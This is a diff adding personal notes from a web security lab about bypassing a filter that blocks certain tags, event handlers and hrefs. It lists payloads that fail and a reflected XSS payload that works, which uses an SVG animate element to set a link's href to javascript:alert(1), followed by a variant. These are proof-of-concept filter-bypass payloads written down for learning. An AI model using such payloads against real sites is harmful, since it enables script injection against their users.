@@ -1,0 +1,24 @@
+this lab doesnt allow for certain tags, any events or any hrefs
+
+so payloads like:
+<a href="evil_code_link">Click here</a>
+
+dont work
+
+<a src="comment">Click here for free Iphone</a>
+
+<a src="/post?postId=4">Click here for free Iphone</a>
+
+could reference a stored XSS injection?
+
+
+
+this is the reflected payload that works:
+<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
+
+when the SVG is rendered and the <text> element is clicked, the <a> element's href attribute is animated to 
+javascript:alert(1), which attempts to execute the JavaScript code alert(1)
+
+
+<svg><animatetransform attributeName="href" values=javascript:alert(1)/><text x=20 y=20>Click me</text></svg>
+
